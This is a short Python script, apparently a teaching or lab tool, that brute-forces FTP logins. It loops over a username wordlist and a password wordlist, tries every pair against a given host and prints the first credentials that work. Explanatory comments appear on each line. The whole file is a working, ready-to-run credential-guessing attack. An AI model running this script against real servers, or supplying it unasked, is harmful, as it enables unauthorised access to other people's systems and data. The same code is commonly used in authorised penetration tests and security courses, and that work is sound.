#!/usr/bin/python

import ftplib # This library provides tools for interacting with FTP servers.
import sys #  This library allows access to system-specific parameters and functions, including command-line arguments.

def main_ftp(ip, username, password): # Takes an IP address, username, and password as input.
    try: # Attempts to establish an FTP connection to the specified IP address
        ftp = ftplib.FTP(ip)
        ftp.login(username, password) # Tries to log in using the provided credentials
        print(f"[+] Valid credentials: {username}/{password}") # If successful, it prints a message indicating valid credentials and then closes the connection.
        ftp.quit()
        sys.exit(1)
    except ftplib.error_perm: # If login fails (ftplib.error_perm exception) it silently ignores the error using pass.
        pass

def credentials(ip, username_file, password_file): # Takes an IP address, a username file, and a password file as input.
    with open(username_file, 'r') as users, open(password_file, 'r') as passwords: # Opens both the username and password files for reading.
        for i in users: # Iterates through each line in the username file.
            i = i.strip() 
            passwords.seek(0) # For each username, it resets the password file's read pointer to the beginning and iterates through each line in the password file
            for j in passwords:
                j = j.strip()
                main_ftp(ip, i, j) # Calls the main_ftp function with the current username and password combination to attempt login.

if __name__ == "__main__":
    if len(sys.argv) != 4: # Checks if the correct number of command-line arguments (4) is provided.
        print("Usage: python ftp_brute_force.py <hostname> <username_file> <password_file>")
        sys.exit(1) # If not, it prints a usage message and exits.
    ip = sys.argv[1]
    username_file = sys.argv[2] # Otherwise, it extracts the IP address, username file path, and password file path from the arguments.
    password_file = sys.argv[3]
    credentials(ip, username_file, password_file) # Calls the credentials function to start the brute-force process.


